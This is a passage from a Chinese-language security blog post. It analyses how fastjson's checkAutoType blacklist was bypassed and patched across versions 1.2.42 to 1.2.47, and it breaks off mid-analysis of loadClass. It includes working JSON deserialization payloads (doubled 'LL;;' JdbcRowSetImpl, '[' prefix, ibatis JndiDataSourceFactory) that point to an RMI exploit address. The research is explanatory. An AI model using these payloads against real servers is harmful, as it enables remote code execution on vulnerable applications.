可以发现这边只进行了一次删除</span></span><br><span class="line">      <span class="keyword">if</span> ((((BASIC</span><br><span class="line">              ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">              * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">long</span> hash = h3;</span><br><span class="line">          <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">          <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">              hash ^= className.charAt(i);</span><br><span class="line">              hash *= PRIME;</span><br><span class="line">              <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                  <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                      <span class="keyword">return</span> clazz;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure><p>确实有效的干掉了L开头；结尾的payload。</p><h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><p>但是可以发现在以上的处理中，只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.42绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.42绕过 7u21</span><br><span class="line">同样加上LL ;;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20ylpp2j31qk0m27b7.jpg" alt="1.2.42-绕过jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae216919uj31rr0u5wo1.jpg" alt="1.2.42绕过7u21-计算器.png"></p><h3 id="1-2-43版本修复"><a href="#1-2-43版本修复" class="headerlink" title="1.2.43版本修复"></a>1.2.43版本修复</h3><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p><p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>的部分代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line"><span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"><span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="comment">//L开头，；结尾</span></span><br><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="comment">//LL开头</span></span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="comment">//直接爆出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见就对了LL开头的绕过进行了封堵。</p><p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p><p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p><h3 id="1-2-44-限制"><a href="#1-2-44-限制" class="headerlink" title="1.2.44 [ 限制"></a>1.2.44 [ 限制</h3><p>1.2.44补充了loadclass时<code>[</code>的利用情况，上面说到过，实际上这种形式的payload是用不了的。</p><p>比如FastjsonExpliot框架中的<code>{&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;###RMI_LDAP_ADDRESS###&quot;,&quot;autoCommit&quot;:true}</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20r1rm1j31jx12n79e.jpg" alt="1.2.42-左括号-失败.png"></p><p>但是在1.2.44中仍然对于这类类名进行了限制，使用同样的payload进行测试。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20kc2g7j31qu1010yj.jpg" alt="1.2.44-左括号-失败.png"></p><h3 id="1-2-45-黑名单添加"><a href="#1-2-45-黑名单添加" class="headerlink" title="1.2.45 黑名单添加"></a>1.2.45 黑名单添加</h3><p>1.2.45添加了黑名单，封堵了一些可以绕过黑名单的payload，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//需要有第三方组件ibatis-core 3:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p><p>之后更新的版本比如1.2.46也都在补充黑名单</p><p>但是在1.2.47时，一个全新的payload就没有这种限制，通杀。</p><h3 id="1-2-47-通杀payload！"><a href="#1-2-47-通杀payload！" class="headerlink" title="1.2.47 通杀payload！"></a>1.2.47 通杀payload！</h3><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p><p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p><p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">    <span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line"><span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p><ol><li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li><li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li></ol><p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p><p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p><ol><li>TypeUtils.getClassFromMapping(typeName)</li><li>deserializers.findClass(typeName)</li></ol><h4 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h4><p>先看desesrializers，一个hashmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = <span class="keyword">new</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure><p>因为我们是从中取值，关注一下它是在哪里赋值的，当前文件搜索<code>deserializers.put</code>。</p><p><code>com.alibaba.fastjson.parser.ParserConfig#initDeserializers</code>：给出一部分截图</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae208j8n5j315c0ks0vj.jpg" alt="initDeserializers.png"></p><p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p><p>除此之外还有两个类会影响到desesrializers这个map</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br><span class="line">    <span class="comment">//太过复杂代码省略</span></span><br></pre></td></tr></table></figure><p>在这个类中会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p><p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码极其简单，但是只在ParserConfig#getDeserializer（就是上面那个类）和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p><p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p><p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p><p>那我们换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p><h4 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h4><p>先看<code>getClassFromMapping</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line"> ...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure><p>看<code>addBaseClassMappings</code>这个方法，方法内容很长，我们就不细看了，但是它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addBaseClassMappings</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.put(<span class="string">"byte"</span>, <span class="keyword">byte</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"short"</span>, <span class="keyword">short</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"int"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"long"</span>, <span class="keyword">long</span>.class);</span><br><span class="line">    <span class="comment">//诸如此类的放入一些固定的class至mappings中</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且还只在两个没毛病的地方调用了这个方法：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae200kj2oj31es06o0tv.jpg" alt="addBaseClassMappings.png"></p><p>前者是一个static静态代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后者是一个<code>clearClassMapping</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void clearClassMapping()&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没戏，不可控。</p><p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p><blockquote><p>其实这个TypeUtils.loadClass，在1.2.25-1.2.41中我们分析过一小段，其实是同一个函数！</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">       <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">       Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">       <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="comment">//是的话，直接返回</span></span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">       <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">           Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">           <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否L开头;结尾，1.2.42，43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">       <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">           String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">           <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">               clazz = classLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">           <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">               clazz = contextClassLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable 